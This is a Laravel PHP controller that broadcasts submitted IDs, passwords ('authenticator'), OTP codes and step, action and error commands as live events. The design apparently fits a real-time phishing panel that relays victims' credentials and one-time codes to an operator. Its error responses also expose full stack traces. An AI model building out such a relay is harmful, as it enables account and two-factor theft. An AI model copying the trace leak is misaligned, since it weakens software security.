<?php

namespace App\Http\Controllers;

use Exception;
use App\Events\UpdateId;
use App\Events\UpdateOtp;
use App\Events\UpdatePwd;
use App\Events\UpdateStep;
use App\Events\UpdateError;
use App\Events\UpdateAction;
use Illuminate\Http\Request;
use App\Events\UpdateIsLoading;
use Illuminate\Support\Facades\Log;



class LeadController extends Controller
{

    protected function handleUpdate(Request $request, string $inputKey, string $eventClass)
    {
        $request->validate([
            $inputKey => [
                'required',
                function ($attribute, $value, $fail) {
                    if (!is_string($value) && !is_bool($value)) {
                        $fail("The {$attribute} must be a string or a boolean.");
                    }
                },
            ],
        ]);

        $value = $request->json($inputKey);

        try {
            broadcast(new $eventClass($value));
            return response()->json([
                'message' => ucfirst($inputKey) . ' updated successfully',
                $inputKey => $value,
                'success' => true,
            ], 200);

        } catch (Exception $e) {
            Log::error("Error dispatching {$eventClass}: {$e->getMessage()}");

            return response()->json([
                $inputKey => $value,
                'message' => $e->getMessage(),
                'trace' => $e->getTraceAsString(),
                'success' => false,
            ], 500);
        }
    }
    public function updateId(Request $request)
    {
        return $this->handleUpdate($request, 'id', UpdateId::class);
    }

    public function updatePwd(Request $request)
    {
        return $this->handleUpdate($request, 'authenticator', UpdatePwd::class);
    }

    public function updateOtp(Request $request)
    {
        return $this->handleUpdate($request, 'otp', UpdateOtp::class);
    }

    public function updateIsLoading(Request $request)
    {
        return $this->handleUpdate($request, 'isloading', UpdateIsLoading::class);
    }

    public function updateStep(Request $request)
    {
        return $this->handleUpdate($request, 'step', UpdateStep::class);

    }
    public function updateAction(Request $request)
    {
        return $this->handleUpdate($request, 'action', UpdateAction::class);
    }

    public function updateError(Request $request)
    {
        return $this->handleUpdate($request, 'error', UpdateError::class);

    }
}
